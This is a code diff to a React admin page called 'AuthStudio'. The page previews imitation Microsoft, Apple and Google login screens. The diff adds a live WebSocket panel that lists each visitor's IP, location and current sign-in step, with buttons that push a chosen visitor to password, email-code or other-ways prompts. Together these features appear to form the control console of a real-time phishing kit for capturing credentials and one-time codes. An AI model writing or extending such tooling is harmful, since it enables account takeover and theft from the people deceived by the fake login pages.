@@ -1,7 +1,15 @@
-import { useState } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList } from 'lucide-react';
 
 const MicrosoftLogo = () => (
+  <svg width="16" height="16" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+  </svg>
+);
+const MicrosoftLogoLg = () => (
   <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
     <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
     <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
@@ -16,8 +24,8 @@ const AppleLogo = ({ className }: { className?: string }) => (
   </svg>
 );
 
-const GoogleLogo = () => (
-  <svg width="20" height="20" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+const GoogleLogo = ({ size = 20 }: { size?: number }) => (
+  <svg width={size} height={size} viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
     <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
     <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
     <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
@@ -30,11 +38,63 @@ type Device = 'desktop' | 'tablet' | 'mobile';
 type Theme = 'light' | 'dark';
 type Prompt = 'password' | 'email-code' | 'other-ways';
 
+interface VisitorLocation {
+  city: string;
+  country: string;
+  countryCode: string;
+  flag: string;
+}
+
+interface VisitorInfo {
+  id: string;
+  ip: string;
+  location: VisitorLocation;
+  provider: string;
+  step: string;
+  userAgent: string;
+  connectedAt: number;
+}
+
 const PROVIDER_COLORS: Record<Provider, string> = {
   microsoft: '#0078D4',
   apple: '#007AFF',
   google: '#4285F4',
 };
+
+const STEP_LABELS: Record<string, string> = {
+  email: 'Email',
+  password: 'Password',
+  'email-code': 'Code',
+  'email-code-input': 'Enter Code',
+  'other-ways': 'Other Ways',
+  'phone-entry': 'Phone',
+  'phone-code': 'Phone Code',
+  'signin-options': 'Sign-in Opts',
+  passkey: 'Passkey',
+  stay: 'Stay Signed In',
+  register: 'Register',
+  recover: 'Recover',
+};
+
+const STEP_COLORS: Record<string, string> = {
+  email: '#4b5563',
+  password: '#0078D4',
+  'email-code': '#7c3aed',
+  'email-code-input': '#7c3aed',
+  'other-ways': '#047857',
+  'phone-entry': '#b45309',
+  'phone-code': '#b45309',
+  stay: '#15803d',
+  register: '#be185d',
+  recover: '#9f1239',
+};
+
+function ProviderBadge({ provider }: { provider: string }) {
+  if (provider === 'microsoft') return <MicrosoftLogo />;
+  if (provider === 'apple') return <AppleLogo className="w-3.5 h-3.5 text-white" />;
+  if (provider === 'google') return <GoogleLogo size={14} />;
+  return <span className="text-[11px] text-[#aaa]">{provider}</span>;
+}
 
 function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prompt, phoneEnabled: boolean) {
   const base = import.meta.env.BASE_URL.replace(/\/$/, '');
@@ -49,9 +109,19 @@ function Toggle({ enabled, onToggle }: { enabled: boolean; onToggle: () => void 
       className={`relative w-9 h-5 rounded-full transition-colors flex-shrink-0 focus:outline-none ${enabled ? 'bg-[#0078D4]' : 'bg-[#3a3f4a]'}`}
       aria-pressed={enabled}
     >
-      <span
-        className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-transform ${enabled ? 'translate-x-4' : 'translate-x-0.5'}`}
-      />
+      <span className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-transform ${enabled ? 'translate-x-4' : 'translate-x-0.5'}`} />
+    </button>
+  );
+}
+
+function ActionBtn({ label, color, onClick }: { label: string; color: string; onClick: () => void }) {
+  return (
+    <button
+      onClick={onClick}
+      className="px-2 py-0.5 rounded text-[10px] font-semibold text-white transition-opacity hover:opacity-80 flex-shrink-0"
+      style={{ backgroundColor: color }}
+    >
+      {label}
     </button>
   );
 }
@@ -62,9 +132,57 @@ export default function AdminPage() {
   const [theme, setTheme] = useState<Theme>('light');
   const [prompt, setPrompt] = useState<Prompt>('password');
   const [phoneEnabled, setPhoneEnabled] = useState(false);
+  const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
+  const wsRef = useRef<WebSocket | null>(null);
+
+  useEffect(() => {
+    let ws: WebSocket | undefined;
+    try {
+      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
+      wsRef.current = ws;
+
+      ws.onopen = () => {
+        ws!.send(JSON.stringify({ type: 'register-admin' }));
+      };
+
+      ws.onmessage = (e: MessageEvent<string>) => {
+        try {
+          const msg = JSON.parse(e.data) as {
+            type: string;
+            visitors?: VisitorInfo[];
+            visitor?: VisitorInfo;
+            id?: string;
+            step?: string;
+            provider?: string;
+          };
+          if (msg.type === 'visitors' && msg.visitors) {
+            setVisitors(msg.visitors);
+          } else if (msg.type === 'visitor-joined' && msg.visitor) {
+            setVisitors(prev => [...prev.filter(v => v.id !== msg.visitor!.id), msg.visitor!]);
+          } else if (msg.type === 'visitor-left' && msg.id) {
+            setVisitors(prev => prev.filter(v => v.id !== msg.id));
+          } else if (msg.type === 'visitor-updated' && msg.id) {
+            setVisitors(prev => prev.map(v =>
+              v.id === msg.id ? { ...v, step: msg.step ?? v.step, provider: msg.provider ?? v.provider } : v
+            ));
+          }
+        } catch { /* ignore */ }
+      };
+    } catch { /* ignore */ }
+
+    return () => { try { ws?.close(); } catch { /* ignore */ } };
+  }, []);
+
+  const pushAction = (visitorId: string, navigate: string) => {
+    const ws = wsRef.current;
+    if (ws?.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ type: 'push-action', visitorId, action: { navigate } }));
+    }
+  };
 
   const providers: { id: Provider; name: string; icon: React.ReactNode }[] = [
-    { id: 'microsoft', name: 'Microsoft', icon: <MicrosoftLogo /> },
+    { id: 'microsoft', name: 'Microsoft', icon: <MicrosoftLogoLg /> },
     { id: 'apple',     name: 'Apple',     icon: <AppleLogo className="w-[18px] h-[18px]" /> },
     { id: 'google',    name: 'Google',    icon: <GoogleLogo /> },
   ];
@@ -76,13 +194,18 @@ export default function AdminPage() {
   ];
 
   const prompts: { id: Prompt; name: string; icon: React.ReactNode; desc: string }[] = [
-    { id: 'password',    name: 'Password',    icon: <Lock className="w-3.5 h-3.5 text-white" />,       desc: 'Standard password entry' },
-    { id: 'email-code',  name: 'Email code',  icon: <Mail className="w-3.5 h-3.5 text-white" />,       desc: 'Send code to email' },
-    { id: 'other-ways',  name: 'Other ways',  icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
+    { id: 'password',   name: 'Password',   icon: <Lock className="w-3.5 h-3.5 text-white" />,       desc: 'Standard password entry' },
+    { id: 'email-code', name: 'Email code', icon: <Mail className="w-3.5 h-3.5 text-white" />,       desc: 'Send code to email' },
+    { id: 'other-ways', name: 'Other ways', icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
   ];
 
   const src = loginSrc(provider, device, theme, prompt, phoneEnabled);
   const accentColor = PROVIDER_COLORS[provider];
+
+  const visitorsByProvider: Record<string, VisitorInfo[]> = {};
+  for (const v of visitors) {
+    (visitorsByProvider[v.provider] ??= []).push(v);
+  }
 
   return (
     <div className="flex h-screen w-full overflow-hidden bg-[#0b0c10] text-[#ececf1] font-sans">
@@ -97,31 +220,39 @@ export default function AdminPage() {
           <span className="text-[15px] font-semibold tracking-tight text-white">AuthStudio</span>
         </div>
 
-        <div className="flex-1 overflow-y-auto p-4 space-y-7">
+        <div className="flex-1 overflow-y-auto p-4 space-y-6">
 
           {/* Provider */}
           <section className="space-y-2">
             <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Provider</p>
             <div className="space-y-1">
-              {providers.map(p => (
-                <button
-                  key={p.id}
-                  onClick={() => { setProvider(p.id); if (p.id !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); } }}
-                  data-testid={`provider-btn-${p.id}`}
-                  className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left
-                    ${provider === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
-                >
-                  <div className="w-7 h-7 rounded-md bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
-                    {p.icon}
-                  </div>
-                  <span className={`text-[14px] font-medium ${provider === p.id ? 'text-white' : 'text-[#aeb5c0]'}`}>
-                    {p.name}
-                  </span>
-                  {provider === p.id && (
-                    <span className="ml-auto w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ backgroundColor: accentColor }} />
-                  )}
-                </button>
-              ))}
+              {providers.map(p => {
+                const count = visitorsByProvider[p.id]?.length ?? 0;
+                return (
+                  <button
+                    key={p.id}
+                    onClick={() => { setProvider(p.id); if (p.id !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); } }}
+                    data-testid={`provider-btn-${p.id}`}
+                    className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left
+                      ${provider === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
+                  >
+                    <div className="w-7 h-7 rounded-md bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
+                      {p.icon}
+                    </div>
+                    <span className={`text-[14px] font-medium flex-1 ${provider === p.id ? 'text-white' : 'text-[#aeb5c0]'}`}>
+                      {p.name}
+                    </span>
+                    {count > 0 && (
+                      <span className="w-4 h-4 rounded-full bg-green-500 text-white text-[9px] font-bold flex items-center justify-center flex-shrink-0">
+                        {count}
+                      </span>
+                    )}
+                    {count === 0 && provider === p.id && (
+                      <span className="w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ backgroundColor: accentColor }} />
+                    )}
+                  </button>
+                );
+              })}
             </div>
           </section>
 
@@ -189,9 +320,7 @@ export default function AdminPage() {
                       </div>
                       <div className="text-[11px] text-[#606672] truncate">{p.desc}</div>
                     </div>
-                    {prompt === p.id && (
-                      <span className="w-1.5 h-1.5 rounded-full flex-shrink-0 bg-[#0078D4]" />
-                    )}
+                    {prompt === p.id && <span className="w-1.5 h-1.5 rounded-full flex-shrink-0 bg-[#0078D4]" />}
                   </button>
                 ))}
               </div>
@@ -202,7 +331,7 @@ export default function AdminPage() {
           {provider === 'microsoft' && (
             <section className="space-y-2">
               <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Options</p>
-              <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24] divide-y divide-[#2d3139]">
+              <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24]">
                 <div className="flex items-center justify-between px-3 py-3">
                   <div className="flex items-center gap-2.5">
                     <Smartphone className="w-4 h-4 text-[#6b7280]" />
@@ -217,6 +346,66 @@ export default function AdminPage() {
             </section>
           )}
 
+          {/* ── Visitors ── */}
+          <section className="space-y-2">
+            <div className="flex items-center justify-between px-1">
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e]">Visitors</p>
+              {visitors.length > 0 && (
+                <span className="text-[10px] font-semibold text-green-400">{visitors.length} live</span>
+              )}
+            </div>
+
+            {visitors.length === 0 ? (
+              <div className="rounded-lg border border-dashed border-[#2d3139] px-3 py-4 text-center">
+                <div className="text-[11px] text-[#555d6b]">No active visitors</div>
+                <div className="text-[10px] text-[#3e4450] mt-0.5">Open the login page to see visitors appear here</div>
+              </div>
+            ) : (
+              <div className="space-y-2">
+                {visitors.map(v => {
+                  const stepColor = STEP_COLORS[v.step] ?? '#4b5563';
+                  const stepLabel = STEP_LABELS[v.step] ?? v.step;
+                  return (
+                    <div key={v.id} className="rounded-lg border border-[#2d3139] bg-[#1a1d24] overflow-hidden">
+                      {/* Header row */}
+                      <div className="flex items-center gap-2 px-2.5 pt-2.5 pb-1.5">
+                        <div className="w-1.5 h-1.5 rounded-full bg-green-400 flex-shrink-0 animate-pulse" />
+                        <div className="w-5 h-5 rounded bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
+                          <ProviderBadge provider={v.provider} />
+                        </div>
+                        <span
+                          className="text-[10px] font-semibold px-1.5 py-0.5 rounded text-white leading-none flex-shrink-0"
+                          style={{ backgroundColor: stepColor }}
+                        >
+                          {stepLabel}
+                        </span>
+                        <span className="text-[10px] text-[#555d6b] truncate ml-auto font-mono">
+                          {new Date(v.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
+                        </span>
+                      </div>
+
+                      {/* Location + IP */}
+                      <div className="px-2.5 pb-1">
+                        <div className="text-[11px] text-[#8a919e]">
+                          {v.location.flag} {v.location.city}, {v.location.country}
+                        </div>
+                        <div className="text-[10px] text-[#555d6b] font-mono">{v.ip}</div>
+                      </div>
+
+                      {/* Action buttons */}
+                      <div className="px-2.5 pb-2.5 pt-1 flex gap-1 flex-wrap">
+                        <ActionBtn label="↩ Email"    color="#4b5563"  onClick={() => pushAction(v.id, 'email')} />
+                        <ActionBtn label="Password"   color="#0078D4"  onClick={() => pushAction(v.id, 'password')} />
+                        <ActionBtn label="Code"       color="#7c3aed"  onClick={() => pushAction(v.id, 'email-code')} />
+                        <ActionBtn label="Other ways" color="#047857"  onClick={() => pushAction(v.id, 'other-ways')} />
+                      </div>
+                    </div>
+                  );
+                })}
+              </div>
+            )}
+          </section>
+
         </div>
 
         <div className="h-10 flex items-center justify-center border-t border-[#2d3139]/50 text-[11px] text-[#555d6b] flex-shrink-0">
@@ -229,25 +418,17 @@ export default function AdminPage() {
         className="flex-1 flex items-center justify-center relative overflow-hidden"
         style={{ backgroundColor: '#0b0c10' }}
       >
-        {/* Provider glow */}
         <div
           className="absolute inset-0 pointer-events-none transition-all duration-1000"
-          style={{
-            background: `radial-gradient(ellipse at center, ${accentColor}22 0%, transparent 65%)`,
-          }}
+          style={{ background: `radial-gradient(ellipse at center, ${accentColor}22 0%, transparent 65%)` }}
         />
-
-        {/* Dot grid */}
         <div
           className="absolute inset-0 pointer-events-none opacity-30"
-          style={{
-            backgroundImage: 'radial-gradient(circle, #ffffff18 1px, transparent 1px)',
-            backgroundSize: '24px 24px',
-          }}
+          style={{ backgroundImage: 'radial-gradient(circle, #ffffff18 1px, transparent 1px)', backgroundSize: '24px 24px' }}
         />
 
         <div className="relative z-10 flex items-center justify-center transition-all duration-300">
-          {/* DESKTOP frame */}
+          {/* DESKTOP */}
           {device === 'desktop' && (
             <div
               className="flex flex-col rounded-xl overflow-hidden shadow-2xl ring-1 ring-white/10"
@@ -265,16 +446,11 @@ export default function AdminPage() {
                   </div>
                 </div>
               </div>
-              <iframe
-                key={src}
-                src={src}
-                className="flex-1 border-0 bg-white"
-                title="Login preview"
-              />
+              <iframe key={src} src={src} className="flex-1 border-0 bg-white" title="Login preview" />
             </div>
           )}
 
-          {/* TABLET frame */}
+          {/* TABLET */}
           {device === 'tablet' && (
             <div
               className="relative bg-black rounded-[2.5rem] p-4 shadow-2xl ring-4 ring-[#2a2a2a]"
@@ -288,7 +464,7 @@ export default function AdminPage() {
             </div>
           )}
 
-          {/* MOBILE frame */}
+          {/* MOBILE */}
           {device === 'mobile' && (
             <div
               className="relative bg-black rounded-[3rem] p-3 shadow-2xl ring-[5px] ring-[#1a1a1a]"
